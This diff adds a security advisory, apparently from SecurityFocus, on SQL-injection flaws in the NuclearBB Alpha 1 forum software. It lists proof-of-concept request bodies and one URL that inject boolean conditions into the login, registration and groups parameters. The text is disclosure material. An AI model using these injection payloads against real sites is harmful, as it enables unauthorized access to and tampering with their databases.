@@ -1,0 +1,98 @@
+source: http://www.securityfocus.com/bid/23555/info
+
+NuclearBB is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+These issues affect NuclearBB Alpha 1; other versions may also be affected. 
+
+=============
+String Inputs
+=============
+
+----------------------------
+login.php - $_POST['submit']
+----------------------------
+
+username=xyz
+password=passxyz
+submit=Login"+and+"1"="0
+
+--------------------------------
+register.php - $_POST['website']
+--------------------------------
+
+username=xyz@xyz.com
+email=xyz@xyz.com
+pass1=passwordxyz
+pass2=passwordxyz
+website=xyz@xyz.com"+and+"1"="0
+location=xyz@xyz.com
+msn=xyz@xyz.com
+yahoo=xyz@xyz.com
+aol=xyz@xyz.com
+icq=xyz@xyz.com
+signature=xyz@xyz.com
+coppa_state=over
+register_submit=Register
+
+----------------------------
+register.php - $_POST['aol']
+----------------------------
+username=xyz@xyz.com
+email=xyz@xyz.com
+pass1=xyz@xyz.com
+pass2=xyz@xyz.com
+website=xyz@xyz.com
+location=xyz@xyz.com
+msn=xyz@xyz.com
+yahoo=xyz@xyz.com
+aol=xyz@xyz.com"+and+"1"="0
+icq=xyz@xyz.com
+signature=xyz@xyz.com
+coppa_state=over
+register_submit=Register
+
+----------------------------------
+register.php - $_POST['signature']
+----------------------------------
+
+username=xyz@xyz.com
+email=xyz@xyz.com
+pass1=xyz@xyz.com
+pass2=xyz@xyz.com
+website=xyz@xyz.com
+location=xyz@xyz.com
+msn=xyz@xyz.com
+yahoo=xyz@xyz.com
+aol=xyz@xyz.com
+icq=xyz@xyz.com
+signature=xyz@xyz.com"+and+"1"="0
+coppa_state=over
+register_submit=Register
+
+==============
+Numeric Inputs
+==============
+-----------------------
+groups.php - $_GET['g']
+-----------------------
+
+http://www.example.com/groups.php?g=1+and+1=0
+
+------------------------------
+register.php - $_POST['email']
+------------------------------
+
+username=xyz@xyz.com
+email=xyz@xyz.com+and+1=0
+pass1=xyz@xyz.com
+pass2=xyz@xyz.com
+website=xyz@xyz.com
+location=xyz@xyz.com
+msn=xyz@xyz.com
+yahoo=xyz@xyz.com
+aol=xyz@xyz.com
+icq=xyz@xyz.com
+signature=xyz@xyz.com
+coppa_state=over&register_submit=Register
